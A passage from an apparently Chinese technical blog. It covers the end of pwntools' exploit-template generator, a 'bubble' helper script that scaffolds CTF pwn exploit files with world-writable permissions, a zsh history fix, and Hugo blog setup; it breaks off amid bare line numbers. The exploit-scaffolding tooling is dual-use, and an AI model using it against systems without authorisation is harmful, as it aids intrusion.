</span></span><span class="line"><span class="cl">            <span class="n">log</span><span class="o">.</span><span class="n">warning</span><span class="p">(</span><span class="s2">&#34;Could not download file </span><span class="si">%r</span><span class="s2">, opening a shell&#34;</span><span class="p">,</span> <span class="n">remote_file</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">s</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">.</span><span class="n">exe</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">args</span><span class="o">.</span><span class="n">exe</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">basename</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">path</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">template</span> <span class="o">=</span> <span class="n">lookup</span><span class="o">.</span><span class="n">get_template</span><span class="p">(</span><span class="s1">&#39;pwnup.mako&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">output</span> <span class="o">=</span> <span class="n">template</span><span class="o">.</span><span class="n">render</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">exe</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                             <span class="n">args</span><span class="o">.</span><span class="n">libc</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                             <span class="n">args</span><span class="o">.</span><span class="n">host</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                             <span class="n">args</span><span class="o">.</span><span class="n">port</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                             <span class="n">args</span><span class="o">.</span><span class="n">user</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                             <span class="n">args</span><span class="o">.</span><span class="n">password</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                             <span class="n">args</span><span class="o">.</span><span class="n">path</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                             <span class="n">args</span><span class="o">.</span><span class="n">quiet</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Fix Mako formatting bs</span>
</span></span><span class="line"><span class="cl">    <span class="n">output</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n\n\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\n\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">output</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Colorize the output if it&#39;s a TTY</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">color</span> <span class="o">==</span> <span class="s1">&#39;always&#39;</span> <span class="ow">or</span> <span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">color</span> <span class="o">==</span> <span class="s1">&#39;auto&#39;</span> <span class="ow">and</span> <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">isatty</span><span class="p">()):</span>
</span></span><span class="line"><span class="cl">        <span class="kn">from</span> <span class="nn">pygments</span> <span class="kn">import</span> <span class="n">highlight</span>
</span></span><span class="line"><span class="cl">        <span class="kn">from</span> <span class="nn">pygments.formatters</span> <span class="kn">import</span> <span class="n">TerminalFormatter</span>
</span></span><span class="line"><span class="cl">        <span class="kn">from</span> <span class="nn">pygments.lexers.python</span> <span class="kn">import</span> <span class="n">PythonLexer</span>
</span></span><span class="line"><span class="cl">        <span class="n">output</span> <span class="o">=</span> <span class="n">highlight</span><span class="p">(</span><span class="n">output</span><span class="p">,</span> <span class="n">PythonLexer</span><span class="p">(),</span> <span class="n">TerminalFormatter</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># If redirected to a file, make the resulting script executable</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">isatty</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span> <span class="n">os</span><span class="o">.</span><span class="n">fchmod</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span> <span class="mo">0o700</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">OSError</span><span class="p">:</span> <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">pwnlib</span><span class="o">.</span><span class="n">commandline</span><span class="o">.</span><span class="n">common</span><span class="o">.</span><span class="n">main</span><span class="p">(</span><span class="vm">__file__</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="bubble">bubble</h4>
<p>在/usr/local/bin建立bubble文件，内容如下，记得赋值可执行权限chmod 777 /usr/local/bin/bubble</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/sh
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="nv">FILE_NAME</span><span class="o">=</span><span class="nv">$1</span>
</span></span><span class="line"><span class="cl"><span class="nv">LIBC_FILE</span><span class="o">=</span><span class="nv">$2</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[</span> <span class="s2">&#34;</span><span class="nv">$FILE_NAME</span><span class="s2">&#34;</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span> <span class="o">]</span><span class="p">;</span><span class="k">then</span>
</span></span><span class="line"><span class="cl">	<span class="nb">printf</span> <span class="s2">&#34;Usage &lt;%s&gt; : bubble &lt;file&gt; &lt;libc_file&gt;\n&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="nb">printf</span> <span class="s2">&#34;Please input the file\n&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="nb">exit</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[</span> <span class="s2">&#34;</span><span class="nv">$LIBC_FILE</span><span class="s2">&#34;</span> <span class="o">]</span><span class="p">;</span><span class="k">then</span>
</span></span><span class="line"><span class="cl">	sudo chmod +x <span class="nv">$1</span>
</span></span><span class="line"><span class="cl">	touch <span class="nv">$1</span>.py
</span></span><span class="line"><span class="cl">	<span class="nb">echo</span> <span class="s2">&#34;[+]Touch Successful!&#34;</span>
</span></span><span class="line"><span class="cl">	code <span class="nv">$1</span>.py
</span></span><span class="line"><span class="cl">	sudo chmod +777 <span class="nv">$1</span>.py
</span></span><span class="line"><span class="cl">	template <span class="nv">$1</span> --libc <span class="nv">$2</span> &gt; <span class="nv">$1</span>.py
</span></span><span class="line"><span class="cl">	sudo xclibc <span class="nv">$1</span> <span class="nv">$2</span>
</span></span><span class="line"><span class="cl">	<span class="nb">echo</span> <span class="s2">&#34;Over&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="nb">exit</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl">sudo chmod +x <span class="nv">$1</span>
</span></span><span class="line"><span class="cl">touch <span class="nv">$1</span>.py
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;[+]Touch Successful!&#34;</span>
</span></span><span class="line"><span class="cl">code <span class="nv">$1</span>.py
</span></span><span class="line"><span class="cl">sudo chmod +777 <span class="nv">$1</span>.py
</span></span><span class="line"><span class="cl">template <span class="nv">$1</span> &gt; <span class="nv">$1</span>.py
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Over&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="zsh-corrupt-history-file-homexxxzsh_history">zsh: corrupt history file /home/XXX/.zsh_history</h2>
<p>原因是不可见字符导致的错误，可以打开~/.zsh_history将发红的字体给删掉，或者使用下面的命令，但是下面的命令可能会使某些命令失效。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> ~/
</span></span><span class="line"><span class="cl">cp .zsh_history zsh_history
</span></span><span class="line"><span class="cl">rm -f .zsh_history 
</span></span><span class="line"><span class="cl">strings zsh_history .zsh_history
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="hugo-博客搭建-windows">hugo 博客搭建 (windows)</h2>
<h4 id="安装">安装</h4>
<p>在安装go 的前提下运行下面的命令</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">go env -w <span class="nv">CGO_ENABLED</span><span class="o">=</span><span class="m">1</span>
</span></span><span class="line"><span class="cl">go install -tags extended github.com/gohugoio/hugo@latest
</span></span></code></pre></td></tr></table>
</div>
</div><p>验证</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">hugo version
</span></span></code></pre></td></tr></table>
</div>
</div><p>(实测当直接下载release版本的时候会出现很多莫名其妙的错误因此最好还是自己编译)</p>
<p>搭建博客,以loveIt为例</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">hugo new site blog #创建blog站点
</span></span><span class="line"><span class="cl">cd blog
</span></span><span class="line"><span class="cl">git clone https://github.com/dillonzq/LoveIt.git themes/LoveIt
</span></span></code></pre></td></tr></table>
</div>
</div><p>修改blog/config.toml</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span><span class="lnt">241
</span><span class="lnt">242
</span><span class="lnt">243
</span><span class="lnt">244
</span><span class="lnt">245
</span><span class="lnt">246
</span><span class="lnt">247
</span><span class="lnt">248
</span><span class="lnt">249
</span><span class="lnt">250
</span><span class="lnt">251
</span><span class="lnt">252
</span><span class="lnt">253
</span><span class="lnt">254
</span><span class="lnt">255
</span><span class="lnt">256
</span><span class="lnt">257
</span><span class="lnt">258
</span><span class="lnt">259
</span><span class="lnt">260
</span><span class="lnt">261
</span><span class="lnt">262
</span><span class="lnt">263
</span><span class="lnt">264
</span><span class="lnt">265
</span><span class="lnt">266
</span><span class="lnt">267
</span><span class="lnt">268
</span><span class="lnt">269
</span><span class="lnt">270
</span><span class="lnt">271
</span><span class="lnt">272
</span><span class="lnt">273
</span><span class="lnt">274
</span><span class="lnt">275
</span><span class="lnt">276
</span><span class="lnt">277
</span><span class="lnt">278
</span><span class="lnt">279
</span><span class="lnt">280
</span><span class="lnt">281
</span><span class="lnt">282
</span><span class="lnt">283
</span><span class="lnt">284
</span><span class="lnt">285
</span><span class="lnt">286
</span><span class="lnt">287
</span><span class="lnt">288
</span><span class="lnt">289
</span><span class="lnt">290
</span><span class="lnt">291
</span><span class="lnt">292
</span><span class="lnt">293
</span><span class="lnt">294
</span><span class="lnt">295
</span><span class="lnt">296
</span><span class="lnt">297
</span><span class="lnt">298
</span><span class="lnt">299
</span><span class="lnt">300
</span><span class="lnt">301
</span><span class="lnt">302
</span><span class="lnt">303
</span><span class="lnt">304
</span><span class="lnt">305
</span><span class="lnt">306
</span><span class="lnt">307
</span><span class="lnt">308
</span><span class="lnt">309
</span><span class="lnt">310
</span><span class="lnt">311
</span><span class="lnt">312
</span><span class="lnt">313
</span><span class="lnt">314
</span><span class="lnt">315
</span><span class="lnt">316
</span><span class="lnt">317
</span><span class="lnt">318
</span><span class="lnt">319
</span><span class="lnt">320
</span><span class="lnt">321
</span><span class="lnt">322
</span><span class="lnt">323
</span><span class="lnt">324
</span><span class="lnt">325
</span><span class="lnt">326
</span><span class="lnt">327
</span><span class="lnt">328
</span><span class="lnt">329
</span><span class="lnt">330
</span><span class="lnt">331
</span><span class="lnt">332
</span><span class="lnt">333
</span><span class="lnt">334
</span><span class="lnt">335
</span><span class="lnt">336
</span><span class="lnt">337
</span><span class="lnt">338
</span><span class="lnt">339
</span><span class="lnt">340
</span><span class="lnt">341
</span><span class="lnt">342
</span><span class="lnt">343
</span><span class="lnt">344
</span><span class="lnt">345
</span><span class="lnt">346
</span><span class="lnt">347
</span><span class="lnt">348
</span><span class="lnt">349
</span><span class="lnt">350
</span><span class="lnt">351
</span><span class="lnt">352
</span><span class="lnt">353
</span><span class="lnt">354
</span><span class="lnt">355
</span><span class="lnt">356
</span><span class="lnt">357
</span><span class="lnt">358
</span><span class="lnt">359
</span><span class="lnt">360
</span><span class="lnt">361
</span><span class="lnt">362
</span><span class="lnt">363
</span><span class="lnt">364
</span><span class="lnt">365
</span><span class="lnt">366
</span><span class="lnt">367
</span><span class="lnt">368
</span><span class="lnt">369
</span><span class="lnt">370
</span><span class="lnt">371
</span><span class="lnt">372
</span><span class="lnt">373
</span><span class="lnt">374
</span><span class="lnt">375
</span><span class="lnt">376
</span><span class="lnt">377
</span><span class="lnt">378
</span><span class="lnt">379
</span><span class="lnt">380
</span><span class="lnt">381
</span><span class="lnt">382
</span><span class="lnt">383
</span><span class="lnt">384
</span><span class="lnt">385
</span><span class="lnt">386
</span><span class="lnt">387
</span><span class="lnt">388
</span><span class="lnt">389
</span><span class="lnt">390
</span><span class="lnt">391
</span><span class="lnt">392
</span><span class="lnt">393
</span><span class="lnt">394
</span><span class="lnt">395
</span><span class="lnt">396
</span><span class="lnt">397
</span><span class="lnt">398
</span><span class="lnt">399
</span><span class="lnt">400
</span><span class="lnt">401
</span><span class="lnt">402
</span><span class="lnt">403
</span><span class="lnt">404
</span><span class="lnt">405
</span><span class="lnt">406
</span><span class="lnt">407
</span><span class="lnt">408
</span><span class="lnt">409
</span><span class="lnt">410
</span><span class="lnt">411
</span><span class="lnt">412
</span><span class="lnt">413
</span><span class="lnt">414
</span><span class="lnt">415
</span><span class="lnt">416
</span><span class="lnt">417
</span><span class="lnt">418
</span><span class="lnt">419
</span><span class="lnt">420
</span><span class="lnt">421
</span><span class="lnt">422
</span><span class="lnt">423
</span><span class="lnt">424
</span><span class="lnt">425
</span><span class="lnt">426
</span><span class="lnt">427
</span><span class="lnt">428
</span><span class="lnt">429
</span><span class="lnt">430
</span><span class="lnt">431
</span><span class="lnt">432
</span><span class="lnt">433
</span><span class="lnt">434
</span><span class="lnt">435
</span><span class="lnt">436
</span><span class="lnt">437
</span><span class="lnt">438
</span><span class="lnt">439
</span><span class="lnt">440
</span><span class="lnt">441
</span><span class="lnt">442
</span><span class="lnt">443
</span><span class="lnt">444
</span><span class="lnt">445
</span><span class="lnt">446
</span><span class="lnt">447
</span><span class="lnt">448
</span><span class="lnt">449
</span><span class="lnt">450
</span><span class="lnt">451
</span><span class="lnt">452
</span><span class="lnt">453
</span><span class="lnt">454
</span><span class="lnt">455
</span><span class="lnt">456
</span><span class="lnt">457
</span><span class="lnt">458
</span><span class="lnt">459
</span><span class="lnt">460
</span><span class="lnt">461
</span><span class="lnt">462
</span><span class="lnt">463
</span><span class="lnt">464
</span><span class="lnt">465
</span><span class="lnt">466
</span><span class="lnt">467
</span><span class="lnt">468
</span><span class="lnt">469
</span><span class="lnt">470
</span><span class="lnt">471
</span><span class="lnt">472
</span><span class="lnt">473
</span><span class="lnt">474
</span><span class="lnt">475
</span><span class="lnt">476
</span><span class="lnt">477
</span><span class="lnt">478
</span><span class="lnt">479
</span><span class="lnt">480
</span><span class="lnt">481
</span><span class="lnt">482
</span><span class="lnt">483
</span><span class="lnt">484
</span><span class="lnt">485
</span><span class="lnt">486
</span><span class="lnt">487
</span><span class="lnt">488
</span><span class="lnt">489
</span><span class="lnt">490
</span><span class="lnt">491
</span><span class="lnt">492
</span><span class="lnt">493
</span><span class="lnt">494
</span><span class="lnt">495
</span><span class="lnt">496
</span><span class="lnt">497
</span><span class="lnt">498
</span><span class="lnt">499
</span><span class="lnt">500
</span><span class="lnt">501
</span><span class="lnt">502
</span><span class="lnt">503
</span><span class="lnt">504
</span><span class="lnt">505
</span><span class="lnt">506
</span><span class="lnt">507
</span><span class="lnt">508
</span><span class="lnt">509
</span><span class="lnt">510
</span><span class="lnt">511
</span><span class="lnt">512
</span><span class="lnt">513
</span><span class="lnt">514
</span><span class="lnt">515
</span><span class="lnt">516
</span><span class="lnt">517
</span><span class="lnt">518
</span><span class="lnt">519
</span><span class="lnt">520
</span><span class="lnt">521
</span><span class="lnt">522
</span><span class="lnt">523
</span><span class="lnt">524
</span><span class="lnt">525
</span><span class="lnt">526
</span><span class="lnt">527
</span><span class="lnt">528
</span><span class="lnt">529
</span><span class="lnt">530
</span><span class="lnt">531
</span><span class="lnt">532
</span><span class="lnt">533
</span><span class="lnt">534
</span><span class="lnt">535
</span><span class="lnt">536
</span><span class="lnt">537
</span><span class="lnt">538
</span><span class="lnt">539
</span><span class="lnt">540
</span><span class="lnt">541
</span><span class="lnt">542
</span><span class="lnt">543
</span><span class="lnt">544
</span><span class="lnt">545
</span><span class="lnt">546
</span><span class="lnt">547
</span><span class="lnt">548
</span><span class="lnt">549
</span><span class="lnt">550
</span><span class="lnt">551
</span><span class="lnt">552
</span><span class="lnt">553
</span><span class="lnt">554
</span><span class="lnt">555
</span><span class="lnt">556
</span><span class="lnt">557
</span><span class="lnt">558
</span><span class="lnt">559
</span><span class="lnt">560
</span><span class="lnt">561
</span><span class="lnt">562
</span><span class="lnt">563
</span><span class="lnt">564
</span><span class="lnt">565
</span><span class="lnt">566
</span><span class="lnt">567
</span><span class="lnt">568
</span><span class="lnt">569
</span><span class="lnt">570
</span><span class="lnt">571
</span><span class="lnt">572
</span><span class="lnt">573
</span><span class="lnt">574
</span><span class="lnt">575
</span><span class="lnt">576
</span><span class="lnt">577
</span><span class="lnt">578
</span><span class="lnt">579
</span><span class="lnt">580
</span><span class="lnt">581
</span><span class="lnt">582
</span><span class="lnt">583
</span><span class="lnt">584
</span><span class="lnt">585
</span><span class="lnt">586
</span><span class="lnt">587
</span><span class="lnt">588
</span><span class="lnt">589
</span><span class="lnt">590
</span><span class="lnt">591
</span><span class="lnt">592
</span><span class="lnt">593
</span><span class="lnt">594
</span><span class="lnt">595
</span><span class="lnt">596
</span><span class="lnt">597
</span><span class="lnt">598
</span><span class="lnt">599
</span><span class="lnt">600
</span><span class="lnt">601
</span><span class="lnt">602
</span><span class="lnt">603
</span><span class="lnt">604
</span><span class="lnt">605
</span><span class="lnt">606
</span><span class="lnt">607
</span><span class="lnt">608
</span><span class="lnt">609
</span><span class="lnt">610
</span><span class="lnt">611
</span><span class="lnt">612
</span><span class="lnt">613
</span><span class="lnt">614
</span><span class="lnt">615
</span><span class="lnt">616
</span><span class="lnt">617
</span><span class="lnt">618
</span><span class="lnt">619
</span><span class="lnt">620
</span><span class="lnt">621
</span><span class="lnt">622
</span><span class="lnt">623
</span><span class="lnt">624
</span><span class="lnt">625
</span><span class="lnt">626
</span><span class="lnt">627
</span><span class="lnt">628
</span><span class="lnt">629
</span><span class="lnt">630
</span><span class="lnt">631
</span><span class="lnt">632
</span><span class="lnt">633
</span><span class="lnt">634
</span><span class="lnt">635
</span><span class="lnt">636
</span><span class="lnt">637
</span><span class="lnt">638
</span><span class="lnt">639
</span><span class="lnt">640
</span><span class="lnt">641
</span><span class="lnt">642
</span><span class="lnt">643
</span><span class="lnt">644
</span><span class="lnt">645
</span><span class="lnt">646
</span><span class="lnt">647
</span><span class="lnt">648
</span><span class="lnt">649
</span><span class="lnt">650
</span><span class="lnt">651
</span><span class="lnt">652
</span><span class="lnt">653
</span><span class="lnt">654
</span><span class="lnt">655
</span><span class="lnt">656
</span><span class="lnt">657
</span><span class="lnt">658
</span><span class="lnt">659
</span><span class="lnt">660
</span><span class="lnt">661
</span><span class="lnt">662
</span><span class="lnt">663
</span><span class="lnt">664
</span><span class="lnt">665
</span><span class="lnt">666
</span><span class="lnt">667
</span><span class="lnt">668
</span><span class="lnt">669
</span><span class="lnt">670
</span><span class="lnt">671
</span><span class="lnt">672
</span><span class="lnt">673
</span><span class="lnt">674
</span><span class="lnt">675
</span><span class="lnt">676
</span><span class="lnt">677
</span><span class="lnt">678
</span><span class="lnt">679
</span><span class="lnt">680
</span><span class="lnt">681
</span><span class="lnt">682
</span><span class="lnt">683
</span><span class="lnt">684
</span><span class="lnt">685
</span><span class="lnt">686
</span><span class="lnt">687
</span><span class="lnt">688
</span><span class="lnt">689
</span><span class="lnt">690
</span><span class="lnt">691
</span><span class="lnt">692
</span><span class="lnt">693
</span><span class="lnt">694
</span><span class="lnt">695
</span><span class="lnt">696
</span><span class="lnt">697
</span><span class="lnt">698
</span><span class="lnt">699
</span><span class="lnt">700
</span><span class="lnt">701
</span><span class="lnt">702
</span><span class="lnt">703
</span><span class="lnt">704
</span><span class="lnt">705
</span><span class="lnt">706
</span><span class="lnt">707
</span><span class="lnt">708
</span><span class="lnt">709
</span><span class="lnt">710
</span><span class="lnt">711
</span><span class="lnt">712
</span><span class="lnt">713
</span><span class="lnt">714
</span><span class="lnt">715
</span><span class="lnt">716
</span><span class="lnt">717
</span><span class="lnt">718
</span><span class="lnt">719
</span><span class="lnt">720
</span><span class="lnt">721
</span><span class="lnt">722
</span><span class="lnt">723
</span><span class="lnt">724
</span><span class="lnt">725
</span><span class="lnt">726
</span><span class="lnt">727
</span><span class="lnt">728
</span><span class="lnt">729
</span><span class="lnt">730
</span><span class="lnt">731
</span><span class="lnt">732
</span><span class="lnt">733
</span><span class="lnt">734
</span><span class="lnt">735
</span><span class="lnt">736
</span></code></pre></td>
<td class="lntd">
